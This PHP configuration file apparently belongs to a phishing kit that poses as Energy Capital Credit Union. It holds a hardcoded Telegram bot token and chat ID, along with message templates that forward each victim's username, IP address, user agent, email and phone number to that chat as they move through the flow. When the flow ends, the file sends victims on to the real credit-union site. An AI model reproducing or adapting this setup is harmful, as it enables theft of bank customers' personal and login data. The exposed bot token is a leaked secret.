<?php

/**
 * Configuration file for Energy PHP Application
 * Contains all configurable settings including Telegram integration
 */

// Telegram Bot Configuration
define('TELEGRAM_ENABLED', true); // Set to false to disable Telegram notifications
define('TELEGRAM_BOT_TOKEN', '7505568412:AAEwzAw9uUnxgXABFaUVq11-I0xBv36LmTw'); // Your Telegram bot token
define('TELEGRAM_CHAT_ID', '1794855545'); // Your Telegram chat ID (can be individual or group)

// Database/File Storage Configuration
define('DATA_STORAGE_PATH', __DIR__ . '/data'); // Path to store user data files
define('SHARED_FILES_PATH', __DIR__ . '/data'); // Path for shared files (fallback)

// Application Configuration
define('APP_NAME', 'Energy Capital Credit Union');
define('APP_VERSION', '1.0.0');
define('DEBUG_MODE', false); // Set to true for development debugging

// Security Configuration
define('SESSION_TIMEOUT', 3600); // Session timeout in seconds (1 hour)
define('MAX_LOGIN_ATTEMPTS', 5); // Maximum failed login attempts before lockout
define('LOGIN_LOCKOUT_TIME', 900); // Lockout time in seconds (15 minutes)

// Flow Configuration
define('FINAL_REDIRECT_URL', 'https://www.eccu.net/'); // Final redirect after completion

// Message Templates
define('TELEGRAM_NEW_USER_MESSAGE', '🆕 New User Registration Started
👤 Username: {username}
🌐 IP: {ip}
📱 User Agent: {user_agent}
⏰ Time: {timestamp}');

define('TELEGRAM_STEP_COMPLETED_MESSAGE', '✅ Step Completed: {step}
👤 Username: {username}
⏰ Time: {timestamp}');

define('TELEGRAM_TERMS_COMPLETED_MESSAGE', '🎉 User Flow Completed!
👤 Username: {username}
📧 Email: {email}
📞 Phone: {phone}
⏰ Completion Time: {timestamp}
📊 Total Steps: {step_count}');

define('TELEGRAM_FLOW_COMPLETED_MESSAGE', '🎉 User Flow Completed!
👤 Username: {username}
📧 Email: {email}
📞 Phone: {phone}
⏰ Completion Time: {timestamp}
📊 Total Steps: {step_count}');

define('TELEGRAM_ERROR_MESSAGE', '❌ Error Occurred
👤 Username: {username}
⚠️ Error: {error}
⏰ Time: {timestamp}');

/**
 * Helper function to get formatted timestamp
 */
function getFormattedTimestamp() {
    return date('Y-m-d H:i:s');
}

/**
 * Helper function to replace template variables
 */
function replaceTemplateVars($template, $vars) {
    foreach ($vars as $key => $value) {
        $template = str_replace('{' . $key . '}', $value, $template);
    }
    return $template;
}

?>
